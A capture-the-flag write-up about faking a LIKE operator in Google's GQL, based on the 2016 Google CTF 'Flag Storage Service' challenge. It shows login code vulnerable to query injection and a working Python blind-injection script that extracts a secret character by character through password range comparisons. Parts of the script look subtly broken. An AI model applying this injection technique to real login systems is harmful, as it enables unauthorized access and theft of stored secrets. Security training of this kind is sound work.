# Do a GQL LIKE query

## Introduction

you can think of a GQL kind as a SQL table, a GQL entity as a SQL row, and a GQL property as a SQL column. However, a SQL row-column lookup is limited to a single value, whereas in GQL a property can be a multiple value property.

GQL offers limited set of commands comparing to SQL, for example, there's no LIKE operator in GQL.

So, here I will show you how to mimic a LIKE operator in GQL.

This trivia was discovered in Google 2016 CTF web challenge `Flag Storage Service`.

## Impact

The most important part of code in this challenge is that we can clearly discover a potential injection point:

```python
@classmethod
def Login(cls, username, password):
    query = "SELECT * FROM User WHERE username = '%s'" % username
    if password is not None:
        query += " AND password = '%s'" % password
```

After the processing procedure, it's importing `google.appengine.api` and executing `qry = ndb.gql(query)`.

Now, if you want to exploit it with normal SQL injection techniques, you'll soon find out GQL almost lacks everything you need, such as LIKE operator.

But, thanks to this [discussion](https://groups.google.com/forum/#!topic/google-appengine-python/pw6jJdwUOAU), we can mimic one in GQL finally.

Therefore, it turns out to be a normal blind SQL injection, and CTF-quality code is provided:

```python
import urllib2
import ssl

def main():
    gcontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
    prev = None # to remember which position is the actual flag fragment
    count = 0 # final determination to end the loop

    flag = ""
    url = "https://next-bitter-flag.ctfcompetition.com/login"
    data = "username=manager' AND password > '"

    should_restart = True
    while should_restart:
        should_restart = False
        for asc in xrange(32, 127):
            print "[Debug] Try {0}".format(asc)
            r = urllib2.urlopen(url, data="{0}{1}".format(data, chr(asc)), context=gcontext).read()
            if r.__sizeof__() == 2185 and asc == 126: # at the last position
                if flag[-1] == '|':
                    flag = flag[:-1] + '}'
                    print "This is your final flag: {0}".format(flag)
                    break
                else:
                    flag = "".join([flag, chr(asc)])
                    data = "".join([data, chr(asc)])
                    print flag
                    should_restart = True
                    break
            elif r.__sizeof__() == 2185:
                prev = chr(asc)
            elif r.__sizeof__() == 2194 and prev is not None:
                flag = "".join([flag, prev])
                data = "".join([data, prev])
                print flag
                should_restart = True
                break

def test():
    assert main() == 'CTF{,Why,did,the,grape,stop,in,the,middle,of,the,road---Because,he,ran,out,of,juice,}'

if __name__ == '__main__':
    print main()
```

## Reference

1. [GQL Reference](https://cloud.google.com/datastore/docs/reference/gql_reference)
2. [Is it possible to do a Gql LIKE query?](https://groups.google.com/forum/#!topic/google-appengine-python/pw6jJdwUOAU)
